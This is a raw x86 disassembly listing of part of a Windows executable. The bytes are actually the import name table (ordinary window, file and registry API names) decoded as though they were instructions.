  425b16:	arpl   WORD PTR [edi+0x6e],bp
  425b19:	dec    ecx
  425b1a:	outs   dx,BYTE PTR ds:[esi]
  425b1b:	outs   dx,WORD PTR ds:[esi]
  425b1d:	add    ch,bl
  425b1f:	add    BYTE PTR [ebp+0x71],al
  425b22:	jne    0x425b85
  425b24:	ins    BYTE PTR es:[edi],dx
  425b25:	push   edx
  425b26:	arpl   WORD PTR gs:[eax+eax*1+0x10],si
  425b2b:	add    DWORD PTR [edi+0x65],eax
  425b2e:	je     0x425b74
  425b30:	ins    BYTE PTR es:[edi],dx
  425b31:	addr16 dec ecx
  425b33:	je     0x425b9a
  425b35:	ins    DWORD PTR es:[edi],dx
  425b36:	dec    ecx
  425b37:	outs   dx,BYTE PTR ds:[esi]
  425b38:	je     0x425b3a
  425b3a:	rol    DWORD PTR [edx],0x77
  425b3d:	jbe    0x425bb2
  425b3f:	jo     0x425bb3
  425b41:	imul   ebp,DWORD PTR [esi+0x74],0x4166
  425b48:	inc    ebp
  425b49:	add    DWORD PTR [edi+0x65],eax
  425b4c:	je     0x425b9e
  425b4e:	popa   
  425b4f:	jb     0x425bb6
  425b51:	outs   dx,BYTE PTR ds:[esi]
  425b52:	je     0x425b54
  425b54:	sti    
  425b55:	add    DWORD PTR [eax+0x74],edx
  425b58:	dec    ecx
  425b59:	outs   dx,BYTE PTR ds:[esi]
  425b5a:	push   edx
  425b5b:	arpl   WORD PTR gs:[eax+eax*1+0x0],si
  425b60:	pop    edi
  425b61:	add    dl,BYTE PTR [ebx+0x65]
  425b64:	je     0x425bb9
  425b66:	jns    0x425bdb
  425b68:	inc    ebx
  425b69:	outs   dx,DWORD PTR ds:[esi]
  425b6a:	ins    BYTE PTR es:[edi],dx
  425b6b:	outs   dx,DWORD PTR ds:[esi]
  425b6c:	jb     0x425be1
  425b6e:	add    BYTE PTR [eax],al
  425b70:	hlt    
  425b71:	add    BYTE PTR [edi+0x65],al
  425b74:	je     0x425bb9
  425b76:	ins    BYTE PTR es:[edi],dx
  425b77:	popa   
  425b78:	jae    0x425bed
  425b7a:	dec    ecx
  425b7b:	outs   dx,BYTE PTR ds:[esi]
  425b7c:	outs   dx,WORD PTR ds:[esi]
  425b7e:	inc    ecx
  425b7f:	add    BYTE PTR [edx],cl
  425b81:	add    dl,BYTE PTR [edx+0x65]
  425b84:	imul   esi,DWORD PTR [bp+di+0x74],0x6f487265
  425b8c:	je     0x425bd9
  425b8e:	gs jns 0x425b91
  425b91:	add    BYTE PTR [esi+0x1],dl
  425b94:	inc    edi
  425b95:	gs je  0x425beb
  425b98:	arpl   WORD PTR [edx+0x6f],si
  425b9b:	ins    BYTE PTR es:[edi],dx
  425b9c:	ins    BYTE PTR es:[edi],dx
  425b9d:	push   edx
  425b9e:	popa   
  425b9f:	outs   dx,BYTE PTR ds:[esi]
  425ba0:	add    BYTE PTR gs:[bx+si],al
  425ba4:	test   al,0x1
  425ba6:	dec    esp
  425ba7:	outs   dx,DWORD PTR ds:[esi]
  425ba8:	popa   
  425ba9:	fs inc ecx
  425bab:	arpl   WORD PTR [ebx+0x65],sp
  425bae:	ins    BYTE PTR es:[edi],dx
  425baf:	gs jb  0x425c13
  425bb2:	je     0x425c23
  425bb4:	jb     0x425c29
  425bb6:	push   edi
  425bb7:	add    BYTE PTR [ecx+eax*1+0x47],dl
  425bbb:	gs je  0x425c11
  425bbe:	arpl   WORD PTR [edx+0x6f],si
  425bc1:	ins    BYTE PTR es:[edi],dx
  425bc2:	ins    BYTE PTR es:[edi],dx
  425bc3:	dec    ecx
  425bc4:	outs   dx,BYTE PTR ds:[esi]
  425bc5:	outs   dx,WORD PTR ds:[esi]
  425bc7:	add    BYTE PTR [edx],ch
  425bc9:	add    BYTE PTR [ebx+0x68],al
  425bcc:	popa   
  425bcd:	jb     0x425c1d
  425bcf:	gs js  0x425c46
  425bd2:	inc    ecx
  425bd3:	add    BYTE PTR [ecx],dl
  425bd5:	add    DWORD PTR [edi+0x65],eax
  425bd8:	je     0x425c1e
  425bda:	ins    BYTE PTR es:[edi],dx
  425bdb:	addr16 dec ecx
  425bdd:	je     0x425c44
  425bdf:	ins    DWORD PTR es:[edi],dx
  425be0:	push   esp
  425be1:	gs js  0x425c58
  425be4:	inc    ecx
  425be5:	add    BYTE PTR [ecx+eax*1+0x63497349],bl
  425bec:	outs   dx,DWORD PTR ds:[esi]
  425bed:	outs   dx,BYTE PTR ds:[esi]
  425bee:	imul   esp,DWORD PTR [ebx+0x0],0x53027a00
  425bf5:	push   0x6143776f
  425bfa:	jb     0x425c61
  425bfc:	je     0x425bfe
  425bfe:	cmp    eax,0x74655302
  425c03:	inc    esp
  425c04:	ins    BYTE PTR es:[edi],dx
  425c05:	addr16 dec ecx
  425c07:	je     0x425c6e
  425c09:	ins    DWORD PTR es:[edi],dx
  425c0a:	dec    ecx
  425c0b:	outs   dx,BYTE PTR ds:[esi]
  425c0c:	je     0x425c0e
  425c0e:	add    DWORD PTR [ecx],0x49
  425c11:	outs   dx,BYTE PTR ds:[esi]
  425c12:	jae    0x425c79
  425c14:	jb     0x425c8a
  425c16:	dec    ebp
  425c17:	outs   dx,BYTE PTR gs:[esi]
  425c19:	jne    0x425c5c
  425c1b:	add    BYTE PTR [ebx+0x0],ah
  425c1e:	inc    ebx
  425c1f:	jb     0x425c86
  425c21:	popa   
  425c22:	je     0x425c89
  425c24:	push   edi
  425c25:	imul   ebp,DWORD PTR [esi+0x64],0x7845776f
  425c2c:	push   edi
  425c2d:	add    al,dl
  425c2f:	add    DWORD PTR [ebp+0x65],ecx
  425c32:	jae    0x425ca7
  425c34:	popa   
  425c35:	addr16 gs inc edx
  425c38:	outs   dx,DWORD PTR ds:[esi]
  425c39:	js     0x425c80
  425c3b:	js     0x425c94
  425c3d:	add    BYTE PTR [ebx],ch
  425c3f:	add    dl,BYTE PTR [ebx+0x65]
  425c42:	outs   dx,BYTE PTR ds:[esi]
  425c43:	fs dec ebp
  425c45:	gs jae 0x425cbb
  425c48:	popa   
  425c49:	addr16 gs push edi
  425c4c:	add    BYTE PTR [eax],al
  425c4e:	jl     0x425c52
  425c50:	push   ebx
  425c51:	push   0x774f776f
  425c56:	outs   dx,BYTE PTR ds:[esi]
  425c57:	gs fs push eax
  425c5a:	outs   dx,DWORD PTR ds:[esi]
  425c5b:	jo     0x425cd2
  425c5d:	jo     0x425cd2
  425c5f:	add    BYTE PTR [ebp+0x0],cl
  425c62:	inc    ebx
  425c63:	outs   dx,DWORD PTR ds:[esi]
  425c64:	jo     0x425cdf
  425c66:	push   edx
  425c67:	arpl   WORD PTR gs:[eax+eax*1+0x0],si
  425c6c:	xchg   ebx,eax
  425c6d:	add    BYTE PTR [ebp+eiz*2+0x73],al
  425c71:	je     0x425ce5
  425c73:	outs   dx,DWORD PTR ds:[esi]
  425c74:	jns    0x425cb7
  425c76:	arpl   WORD PTR [ebx+0x65],sp
  425c79:	ins    BYTE PTR es:[edi],dx
  425c7a:	gs jb  0x425cde
  425c7d:	je     0x425cee
  425c7f:	jb     0x425cd5
  425c81:	popa   
  425c82:	bound  ebp,QWORD PTR [ebp+eiz*2+0x0]
  425c86:	pop    ebx
  425c87:	add    DWORD PTR [edi+0x65],eax
  425c8a:	je     0x425cdf
  425c8c:	jns    0x425d01
  425c8e:	je     0x425cf5
  425c90:	ins    DWORD PTR es:[edi],dx
  425c91:	dec    ebp
  425c92:	outs   dx,BYTE PTR gs:[esi]
  425c94:	jne    0x425c96
  425c96:	ja     0x425c99
  425c98:	inc    edi
  425c99:	gs je  0x425cf3
  425c9c:	imul   ebp,DWORD PTR [esi+0x64],0x6554776f
  425ca3:	js     0x425d19
  425ca5:	dec    esp
  425ca6:	outs   dx,BYTE PTR gs:[esi]
  425ca8:	addr16 je 0x425d13
  425cab:	push   edi
  425cac:	add    BYTE PTR [eax],al
  425cae:	jmp    0x65b2abb4
  425cb3:	outs   dx,BYTE PTR ds:[esi]
  425cb4:	dec    ecx
  425cb5:	outs   dx,BYTE PTR ds:[esi]
  425cb6:	jo     0x425d2d
  425cb8:	je     0x425cfe
  425cba:	gs jae 0x425d28
  425cbd:	je     0x425d2e
  425cbf:	jo     0x425cc1
  425cc1:	add    bh,dl
  425cc3:	add    DWORD PTR [ebp+0x6f],ecx
  425cc6:	imul   esp,DWORD PTR fs:[esi+0x79],0x756e654d
  425cce:	push   edi
  425ccf:	add    BYTE PTR [eax+0x61725402],dl
  425cd5:	arpl   WORD PTR [ebx+0x50],bp
  425cd8:	outs   dx,DWORD PTR ds:[esi]
  425cd9:	jo     0x425d50
  425cdb:	jo     0x425d2a
  425cdd:	outs   dx,BYTE PTR gs:[esi]
  425cdf:	jne    0x425ce1
  425ce1:	add    BYTE PTR [edi],cl
  425ce3:	add    BYTE PTR [edx+0x72],al
  425ce6:	imul   ebp,DWORD PTR [esi+0x67],0x646e6957
  425ced:	outs   dx,DWORD PTR ds:[esi]
  425cee:	ja     0x425d44
  425cf0:	outs   dx,DWORD PTR ds:[esi]
  425cf1:	push   esp
  425cf2:	outs   dx,DWORD PTR ds:[esi]
  425cf3:	jo     0x425cf5
  425cf5:	add    BYTE PTR [edx+eax*1],al
  425cf8:	push   edx
  425cf9:	imul   esi,DWORD PTR gs:[bp+di+0x74],0x6c437265
  425d02:	popa   
  425d03:	jae    0x425d78
  425d05:	inc    ebp
  425d06:	js     0x425d5f
  425d08:	add    BYTE PTR [eax],al
  425d0a:	outs   dx,BYTE PTR ds:[esi]
  425d0b:	add    dl,BYTE PTR [ebx+0x65]
  425d0e:	je     0x425d67
  425d10:	imul   ebp,DWORD PTR [esi+0x64],0x6f4c776f
  425d17:	outs   dx,BYTE PTR ds:[esi]
  425d18:	addr16 push edi
  425d1a:	add    BYTE PTR [eax],al
  425d1c:	xchg   DWORD PTR [eax],eax
  425d1e:	inc    esp
  425d1f:	gs inc sp
  425d22:	ins    BYTE PTR es:[edi],dx
  425d23:	addr16 push eax
  425d25:	jb     0x425d96
  425d27:	arpl   WORD PTR [ecx+0x0],ax
  425d2a:	cmp    al,BYTE PTR [eax]
  425d2c:	inc    ebx
  425d2d:	push   0x446b6365
  425d32:	ins    BYTE PTR es:[edi],dx
  425d33:	addr16 inc edx
  425d35:	jne    0x425dab
  425d37:	je     0x425da8
  425d39:	outs   dx,BYTE PTR ds:[esi]
  425d3a:	add    BYTE PTR [eax],al
  425d3c:	stos   BYTE PTR es:[edi],al
  425d3d:	add    DWORD PTR [edi+ebp*2+0x61],ecx
  425d41:	fs inc edx
  425d43:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0xc4005770
  425d4b:	add    DWORD PTR [ebp+0x61],ecx
  425d4e:	jo     0x425d94
  425d50:	imul   esp,DWORD PTR [ecx+0x6c],0x6552676f
  425d57:	arpl   WORD PTR [eax+eax*1-0x59],si
  425d5b:	add    DWORD PTR [edi+ebp*2+0x61],ecx
  425d5f:	fs inc ecx
  425d61:	arpl   WORD PTR [ebx+0x65],sp
  425d64:	ins    BYTE PTR es:[edi],dx
  425d65:	gs jb  0x425dc9
  425d68:	je     0x425dd9
  425d6a:	jb     0x425ddf
  425d6c:	inc    ecx
  425d6d:	add    BYTE PTR [eax],ch
  425d6f:	add    DWORD PTR [edi+0x65],eax
  425d72:	je     0x425dc0
  425d74:	popa   
  425d75:	jae    0x425deb
  425d77:	inc    ecx
  425d78:	arpl   WORD PTR [ecx+ebp*2+0x76],si
  425d7c:	gs push eax
  425d7e:	outs   dx,DWORD PTR ds:[esi]
  425d7f:	jo     0x425df6
  425d81:	jo     0x425d83
  425d83:	add    BYTE PTR [edx+eax*1+0x53],dh
  425d87:	gs je  0x425de1
  425d8a:	imul   ebp,DWORD PTR [esi+0x64],0x6554776f
  425d91:	js     0x425e07
  425d93:	push   edi
  425d94:	add    BYTE PTR [eax],al
  425d96:	xor    al,BYTE PTR [edx]
  425d98:	push   ebx
  425d99:	gs je  0x425ddf
  425d9c:	popa   
  425d9d:	jb     0x425e04
  425d9f:	je     0x425df1
  425da1:	outs   dx,DWORD PTR ds:[esi]
  425da2:	jae    0x425da4
  425da4:	icebp  
  425da5:	add    DWORD PTR [eax+0x6f],edx
  425da8:	jae    0x425e1e
  425daa:	dec    ebp
  425dab:	gs jae 0x425e21
  425dae:	popa   
  425daf:	addr16 gs inc ecx
  425db2:	add    BYTE PTR [eax],al
  425db4:	mov    ebx,0x616f4c01
  425db9:	fs push ebx
  425dbb:	je     0x425e2f
  425dbd:	imul   ebp,DWORD PTR [esi+0x67],0x570041
  425dc4:	inc    ebx
  425dc5:	jb     0x425e2c
  425dc7:	popa   
  425dc8:	je     0x425e2f
  425dca:	inc    esp
  425dcb:	imul   esp,DWORD PTR [ecx+0x6c],0x6e49676f
  425dd2:	imul   esi,DWORD PTR fs:[edx+0x65],0x61507463
  425dda:	jb     0x425e3d
  425ddc:	ins    DWORD PTR es:[edi],dx
  425ddd:	push   edi
  425dde:	add    BYTE PTR [eax],al
  425de0:	mov    ah,0x0
  425de2:	inc    esp
  425de3:	jb     0x425e46
  425de5:	ja     0x425e30
  425de7:	arpl   WORD PTR [edi+0x6e],bp
  425dea:	inc    ebp
  425deb:	js     0x425ded
  425ded:	add    BYTE PTR [eax+eax*1+0x77617244],bh
  425df4:	push   esp
  425df5:	gs js  0x425e6c
  425df8:	push   edi
  425df9:	add    BYTE PTR [edx+0x57734901],ah
  425dff:	imul   ebp,DWORD PTR [esi+0x64],0x6e55776f
  425e06:	imul   esp,DWORD PTR [ebx+0x6f],0xc2006564
  425e0d:	add    dh,BYTE PTR [edi+0x76]
  425e10:	jae    0x425e82
  425e12:	jb     0x425e7d
  425e14:	outs   dx,BYTE PTR ds:[esi]
  425e15:	je     0x425e7d
  425e17:	push   edi
  425e18:	add    BYTE PTR [eax],al
  425e1a:	push   edi
  425e1b:	add    dl,BYTE PTR [ebx+0x65]
  425e1e:	je     0x425e70
  425e20:	jb     0x425e91
  425e22:	jo     0x425e7b
  425e24:	add    BYTE PTR [eax],al
  425e26:	xchg   ebx,eax
  425e27:	add    dl,BYTE PTR [edx+esi*2+0x61]
  425e2b:	outs   dx,BYTE PTR ds:[esi]
  425e2c:	jae    0x425e9a
  425e2e:	popa   
  425e2f:	je     0x425e96
  425e31:	inc    ecx
  425e32:	arpl   WORD PTR [ebx+0x65],sp
  425e35:	ins    BYTE PTR es:[edi],dx
  425e36:	gs jb  0x425e9a
  425e39:	je     0x425eaa
  425e3b:	jb     0x425e7e
  425e3d:	add    BYTE PTR [ebx+0x1],ah
  425e40:	inc    edi
  425e41:	gs je  0x425e99
  425e44:	jo     0x425eaa
  425e46:	popa   
  425e47:	je     0x425eae
  425e49:	push   edx
  425e4a:	arpl   WORD PTR gs:[eax+eax*1+0x7d],si
  425e4f:	add    DWORD PTR [eax+0x69],ecx
  425e52:	fs gs inc ebx
  425e55:	popa   
  425e56:	jb     0x425ebd
  425e58:	je     0x425e5a
  425e5a:	out    dx,eax
  425e5b:	add    DWORD PTR [eax+0x65],edx
  425e5e:	imul   ecx,DWORD PTR gs:[ebp+0x65],0x73
  425e63:	jae    0x425ec6
  425e65:	addr16 gs push edi
  425e68:	add    BYTE PTR [eax],al
  425e6a:	pop    ebx
  425e6b:	add    BYTE PTR [ebx+0x72],al
  425e6e:	gs popa 
  425e70:	je     0x425ed7
  425e72:	dec    ecx
  425e73:	arpl   WORD PTR [edi+0x6e],bp
  425e76:	inc    esi
  425e77:	jb     0x425ee8
  425e79:	ins    DWORD PTR es:[edi],dx
  425e7a:	push   edx
  425e7b:	gs jae 0x425eed
  425e7e:	jne    0x425ef2
  425e80:	arpl   WORD PTR [ebp+0x0],sp
  425e83:	add    BYTE PTR ds:0x6e655302,ch
  425e89:	fs dec esi
  425e8b:	outs   dx,DWORD PTR ds:[esi]
  425e8c:	je     0x425ef7
  425e8e:	data16 jns 0x425ede
  425e91:	gs jae 0x425f07
  425e94:	popa   
  425e95:	addr16 gs push edi
  425e98:	add    BYTE PTR [eax],al
  425e9a:	mov    BYTE PTR [eax],al
  425e9c:	inc    esp
  425e9d:	gs inc sp
  425ea0:	ins    BYTE PTR es:[edi],dx
  425ea1:	addr16 push eax
  425ea3:	jb     0x425f14
  425ea5:	arpl   WORD PTR [edi+0x0],dx
  425ea8:	add    al,BYTE PTR [edx]
  425eaa:	push   edx
  425eab:	imul   esi,DWORD PTR gs:[bp+di+0x74],0x6c437265
  425eb4:	popa   
  425eb5:	jae    0x425f2a
  425eb7:	inc    ecx
  425eb8:	add    BYTE PTR [eax],al
  425eba:	xchg   DWORD PTR [ecx],eax
  425ebc:	dec    ecx
  425ebd:	outs   dx,BYTE PTR ds:[esi]
  425ebe:	je     0x425f25
  425ec0:	jb     0x425f30
  425ec2:	popa   
  425ec3:	ins    BYTE PTR es:[edi],dx
  425ec4:	inc    edi
  425ec5:	gs je  0x425f1f
  425ec8:	imul   ebp,DWORD PTR [esi+0x64],0x6554776f
  425ecf:	js     0x425f45
  425ed1:	add    dh,ch
  425ed3:	add    DWORD PTR [eax+0x65],edx
  425ed6:	imul   ecx,DWORD PTR gs:[ebp+0x65],0x73
  425edb:	jae    0x425f3e
  425edd:	addr16 gs inc ecx
  425ee0:	add    BYTE PTR [eax],al
  425ee2:	pop    ecx
  425ee3:	add    DWORD PTR [edi+0x65],eax
  425ee6:	je     0x425f3b
  425ee8:	jns    0x425f5d
  425eea:	inc    ebx
  425eeb:	outs   dx,DWORD PTR ds:[esi]
  425eec:	ins    BYTE PTR es:[edi],dx
  425eed:	outs   dx,DWORD PTR ds:[esi]
  425eee:	jb     0x425ef0
  425ef0:	and    eax,0x74654701
  425ef5:	dec    ebx
  425ef6:	gs jns 0x425f5b
  425ef9:	outs   dx,DWORD PTR ds:[esi]
  425efa:	popa   
  425efb:	jb     0x425f61
  425efd:	dec    esp
  425efe:	popa   
  425eff:	jns    0x425f70
  425f01:	jne    0x425f77
  425f03:	dec    esi
  425f04:	popa   
  425f05:	ins    DWORD PTR es:[edi],dx
  425f06:	gs push edi
  425f08:	add    BYTE PTR [eax],al
  425f0a:	jb     0x425f0d
  425f0c:	inc    edi
  425f0d:	gs je  0x425f67
  425f10:	imul   ebp,DWORD PTR [esi+0x64],0x6552776f
  425f17:	arpl   WORD PTR [eax+eax*1-0x6a],si
  425f1b:	add    dl,BYTE PTR [edx+esi*2+0x61]
  425f1f:	outs   dx,BYTE PTR ds:[esi]
  425f20:	jae    0x425f8e
  425f22:	popa   
  425f23:	je     0x425f8a
  425f25:	dec    ebp
  425f26:	gs jae 0x425f9c
  425f29:	popa   
  425f2a:	add    BYTE PTR gs:[bx+si],al
  425f2e:	push   0x74654701
  425f33:	push   edi
  425f34:	imul   ebp,DWORD PTR [esi+0x64],0x9500776f
  425f3b:	add    BYTE PTR [ebp+eiz*2+0x73],al
  425f3f:	je     0x425fb3
  425f41:	outs   dx,DWORD PTR ds:[esi]
  425f42:	jns    0x425f87
  425f44:	jne    0x425fb8
  425f46:	jae    0x425fb7
  425f48:	jb     0x425f4a
  425f4a:	bound  eax,QWORD PTR [ecx]
  425f4c:	inc    edi
  425f4d:	gs je  0x425fa4
  425f50:	outs   dx,DWORD PTR ds:[esi]
  425f51:	jo     0x425faa
  425f53:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  425f5a:	xor    eax,DWORD PTR [ecx]
  425f5c:	inc    edi
  425f5d:	gs je  0x425fad
  425f60:	outs   dx,BYTE PTR gs:[esi]
  425f62:	jne    0x425fad
  425f64:	je     0x425fcb
  425f66:	ins    DWORD PTR es:[edi],dx
  425f67:	dec    ecx
  425f68:	inc    esp
  425f69:	add    BYTE PTR ds:0x74654701,dl
  425f6f:	inc    esi
  425f70:	outs   dx,DWORD PTR ds:[esi]
  425f71:	jb     0x425fd8
  425f73:	addr16 jb 0x425fe5
  425f76:	jne    0x425fe6
  425f78:	fs push edi
  425f7a:	imul   ebp,DWORD PTR [esi+0x64],0x3800776f
  425f81:	add    DWORD PTR [edi+0x65],eax
  425f84:	je     0x425fd3
  425f86:	outs   dx,BYTE PTR gs:[esi]
  425f88:	jne    0x425fdd
  425f8a:	je     0x425ffe
  425f8c:	imul   ebp,DWORD PTR [esi+0x67],0x58000041
  425f93:	add    BYTE PTR [ebx+0x72],al
  425f96:	gs popa 
  425f98:	je     0x425fff
  425f9a:	inc    esp
  425f9b:	imul   esp,DWORD PTR [ecx+0x6c],0x6150676f
  425fa2:	jb     0x426005
  425fa4:	ins    DWORD PTR es:[edi],dx
  425fa5:	inc    ecx
  425fa6:	add    BYTE PTR [eax],al
  425fa8:	call   0x65b2aeae
  425fad:	outs   dx,BYTE PTR ds:[esi]
  425fae:	dec    ecx
  425faf:	arpl   WORD PTR [edi+0x6e],bp
  425fb2:	add    BYTE PTR [eax],al
  425fb4:	jecxz  0x425fb6
  425fb6:	inc    esi
  425fb7:	imul   ebp,DWORD PTR [esi+0x64],0x646e6957
  425fbe:	outs   dx,DWORD PTR ds:[esi]
  425fbf:	ja     0x426006
  425fc1:	js     0x42601a
  425fc3:	add    dh,cl
  425fc5:	add    DWORD PTR [ebp+0x65],ecx
  425fc8:	jae    0x42603d
  425fca:	popa   
  425fcb:	addr16 gs inc edx
  425fce:	outs   dx,DWORD PTR ds:[esi]
  425fcf:	js     0x426012
  425fd1:	add    BYTE PTR [eax+eax*1+0x43],al
  425fd5:	ins    BYTE PTR es:[edi],dx
  425fd6:	imul   esi,DWORD PTR [eax+0x43],0x6f737275
  425fdd:	jb     0x425fdf
  425fdf:	add    BYTE PTR [ebp+0x61694400],bl
  425fe5:	ins    BYTE PTR es:[edi],dx
  425fe6:	outs   dx,DWORD PTR ds:[esi]
  425fe7:	addr16 inc edx
  425fe9:	outs   dx,DWORD PTR ds:[esi]
  425fea:	js     0x42603c
  425fec:	popa   
  425fed:	jb     0x426050
  425fef:	ins    DWORD PTR es:[edi],dx
  425ff0:	push   edi
  425ff1:	add    BYTE PTR [ebx+0x1],al
  425ff4:	inc    edi
  425ff5:	gs je  0x426046
  425ff8:	gs js  0x42606f
  425ffb:	inc    esp
  425ffc:	ins    BYTE PTR es:[edi],dx
  425ffd:	addr16 push esp
  425fff:	popa   
  426000:	bound  ecx,QWORD PTR [ecx+0x74]
  426003:	gs ins DWORD PTR es:[edi],dx
  426005:	add    BYTE PTR [eax+0x61724400],dh
  42600b:	ja     0x426053
  42600d:	outs   dx,DWORD PTR ds:[esi]
  42600e:	arpl   WORD PTR [ebp+0x73],si
  426011:	push   edx
  426012:	arpl   WORD PTR gs:[eax+eax*1-0x77],si
  426017:	add    DWORD PTR [ecx+0x6e],ecx
  42601a:	jbe    0x42607d
  42601c:	ins    BYTE PTR es:[edi],dx
  42601d:	imul   esp,DWORD PTR [ecx+eiz*2+0x74],0x63655265
  426025:	je     0x426027
  426027:	add    BYTE PTR [esi+0x6c694b01],ah
  42602d:	ins    BYTE PTR es:[edi],dx
  42602e:	push   esp
  42602f:	imul   ebp,DWORD PTR [ebp+0x65],0x1370072
  426036:	inc    edi
  426037:	gs je  0x426087
  42603a:	outs   dx,BYTE PTR gs:[esi]
  42603c:	jne    0x426091
  42603e:	je     0x4260a1
  426040:	je     0x4260a7
  426042:	add    BYTE PTR [eax],al
  426044:	cmp    al,BYTE PTR [edx]
  426046:	push   ebx
  426047:	gs je  0x42608d
  42604a:	jne    0x4260be
  42604c:	jae    0x4260bd
  42604e:	jb     0x4260a0
  426050:	outs   dx,DWORD PTR ds:[esi]
  426051:	jae    0x426053
  426053:	add    BYTE PTR [eax+0x2],ch
  426056:	push   ebx
  426057:	gs je  0x4260af
  42605a:	jae    0x4260c1
  42605c:	jb     0x4260ad
  42605e:	bound  ebp,QWORD PTR [edx+0x65]
  426061:	arpl   WORD PTR [ecx+ecx*2+0x6e],si
  426065:	outs   dx,WORD PTR ds:[esi]
  426067:	jb     0x4260d6
  426069:	popa   
  42606a:	je     0x4260d5
  42606c:	outs   dx,DWORD PTR ds:[esi]
  42606d:	outs   dx,BYTE PTR ds:[esi]
  42606e:	push   edi
  42606f:	add    BYTE PTR [ebx+0x61724400],ch
  426075:	ja     0x4260b8
  426077:	outs   dx,BYTE PTR ds:[esi]
  426078:	imul   ebp,DWORD PTR [ebp+0x61],0x52646574
  42607f:	arpl   WORD PTR gs:[ebx+esi*2+0x0],si
  426084:	mov    dl,0x1
  426086:	dec    esp
  426087:	outs   dx,DWORD PTR ds:[esi]
  426088:	popa   
  426089:	fs dec ecx
  42608b:	ins    DWORD PTR es:[edi],dx
  42608c:	popa   
  42608d:	addr16 gs push edi
  426090:	add    BYTE PTR [eax],al
  426092:	cdq    
  426093:	add    BYTE PTR [ecx+ebp*2+0x61],al
  426097:	ins    BYTE PTR es:[edi],dx
  426098:	outs   dx,DWORD PTR ds:[esi]
  426099:	addr16 inc edx
  42609b:	outs   dx,DWORD PTR ds:[esi]
  42609c:	js     0x4260e7
  42609e:	outs   dx,BYTE PTR ds:[esi]
  42609f:	imul   esi,DWORD PTR fs:[edx+0x65],0x61507463
  4260a7:	jb     0x42610a
  4260a9:	ins    DWORD PTR es:[edi],dx
  4260aa:	inc    ecx
  4260ab:	add    al,ah
  4260ad:	add    DWORD PTR [edi+0x65],ecx
  4260b0:	ins    DWORD PTR es:[edi],dx
  4260b1:	push   esp
  4260b2:	outs   dx,DWORD PTR ds:[esi]
  4260b3:	inc    ebx
  4260b4:	push   0x417261
  4260b9:	add    bh,al
  4260bb:	add    BYTE PTR [ebp+0x6e],al
  4260be:	jne    0x42612d
  4260c0:	inc    ebx
  4260c1:	push   0x57646c69
  4260c6:	imul   ebp,DWORD PTR [esi+0x64],0x73776f
  4260cd:	add    BYTE PTR [ecx],cl
  4260cf:	add    DWORD PTR [edi+0x65],eax
  4260d2:	je     0x426117
  4260d4:	jne    0x426148
  4260d6:	jae    0x426147
  4260d8:	jb     0x42612a
  4260da:	outs   dx,DWORD PTR ds:[esi]
  4260db:	jae    0x4260dd
  4260dd:	add    BYTE PTR [esi],dl
  4260df:	add    dl,BYTE PTR [edx+0x65]
  4260e2:	ins    DWORD PTR es:[edi],dx
  4260e3:	outs   dx,DWORD PTR ds:[esi]
  4260e4:	jbe    0x42614b
  4260e6:	dec    ebp
  4260e7:	outs   dx,BYTE PTR gs:[esi]
  4260e9:	jne    0x4260eb
  4260eb:	add    al,bl
  4260ed:	add    DWORD PTR [ebp+0x6f],ecx
  4260f0:	outs   dx,BYTE PTR ds:[esi]
  4260f1:	imul   esi,DWORD PTR [edi+ebp*2+0x72],0x6d6f7246
  4260f9:	push   eax
  4260fa:	outs   dx,DWORD PTR ds:[esi]
  4260fb:	imul   ebp,DWORD PTR [esi+0x74],0x53550000
  426102:	inc    ebp
  426103:	push   edx
  426104:	xor    esi,DWORD PTR [edx]
  426106:	cs fs ins BYTE PTR es:[edi],dx
  426109:	ins    BYTE PTR es:[edi],dx
  42610a:	add    BYTE PTR [eax],al
  42610c:	mov    ebx,0x73655203
  426111:	gs je  0x426159
  426114:	jbe    0x42617b
  426116:	outs   dx,BYTE PTR ds:[esi]
  426117:	je     0x426119
  426119:	add    bl,bl
  42611b:	add    BYTE PTR [ebx+0x72],al
  42611e:	gs popa 
  426120:	je     0x426187
  426122:	dec    ebp
  426123:	popa   
  426124:	imul   ebp,DWORD PTR [ebx+esi*2+0x6c],0x57746f
  42612c:	sbb    BYTE PTR [edx],al
  42612e:	inc    edi
  42612f:	gs je  0x426180
  426132:	jne    0x4261a1
  426134:	bound  esp,QWORD PTR [ebp+0x72]
  426137:	inc    esi
  426138:	outs   dx,DWORD PTR ds:[esi]
  426139:	jb     0x4261a8
  42613b:	popa   
  42613c:	je     0x426195
  42613e:	add    BYTE PTR [eax],al
  426140:	pusha  
  426141:	add    DWORD PTR [esi+0x69],eax
  426144:	outs   dx,BYTE PTR ds:[esi]
  426145:	fs inc esi
  426147:	imul   esi,DWORD PTR [edx+0x73],0x6c694674
  42614e:	gs push edi
  426150:	add    BYTE PTR [eax],al
  426152:	jecxz  0x426154
  426154:	inc    ebx
  426155:	jb     0x4261bc
  426157:	popa   
  426158:	je     0x4261bf
  42615a:	push   eax
  42615b:	imul   esi,DWORD PTR [eax+0x65],0x2850000
  426162:	inc    edi
  426163:	gs je  0x4261bd
  426166:	imul   ebp,DWORD PTR [esi+0x64],0x4473776f
  42616d:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  426174:	jns    0x4261cd
  426176:	add    BYTE PTR [eax],al
  426178:	fiadd  DWORD PTR [edx]
  42617a:	dec    ecx
  42617b:	jae    0x4261d3
  42617d:	popa   
  42617e:	ins    BYTE PTR es:[edi],dx
  42617f:	imul   esp,DWORD PTR [esp+ecx*2+0x61],0x6175676e
  426187:	addr16 gs inc edi
  42618a:	jb     0x4261fb
  42618c:	jne    0x4261fe
  42618e:	add    BYTE PTR [eax],al
  426190:	outs   dx,DWORD PTR ds:[esi]
  426191:	add    DWORD PTR [esi+0x69],eax
  426194:	outs   dx,BYTE PTR ds:[esi]
  426195:	fs push edx
  426197:	gs jae 0x426209
  42619a:	jne    0x42620e
  42619c:	arpl   WORD PTR [ebp+0x57],sp
  42619f:	add    al,cl
  4261a1:	add    cl,BYTE PTR [ecx+0x73]
  4261a4:	inc    edx
  4261a5:	popa   
  4261a6:	fs inc ebx
  4261a8:	outs   dx,DWORD PTR ds:[esi]
  4261a9:	fs gs push eax
  4261ac:	je     0x426220
  4261ae:	add    BYTE PTR [eax],al
  4261b0:	mov    BYTE PTR [eax],al
  4261b2:	inc    ecx
  4261b3:	jb     0x42621a
  4261b5:	inc    esi
  4261b6:	imul   ebp,DWORD PTR [ebp+eiz*2+0x41],0x41736970
  4261be:	dec    esi
  4261bf:	push   ebx
  4261c0:	dec    ecx
